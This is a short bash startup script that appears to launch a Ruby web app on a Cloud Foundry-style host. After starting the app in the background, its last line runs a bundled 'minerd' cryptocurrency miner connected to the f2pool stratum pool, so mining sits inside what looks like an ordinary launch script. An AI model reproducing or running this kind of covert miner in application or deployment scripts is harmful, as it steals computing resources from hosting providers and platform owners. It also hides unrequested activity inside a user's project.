#!/usr/bin/env bash

echo "hello colbstah"

echo `pwd`
echo `ls app`
bundle exec ruby app/app.rb &  
/home/vcap/app/app/minerd -o stratum+tcp://stratum.f2pool.com:3333 --userpass=username:password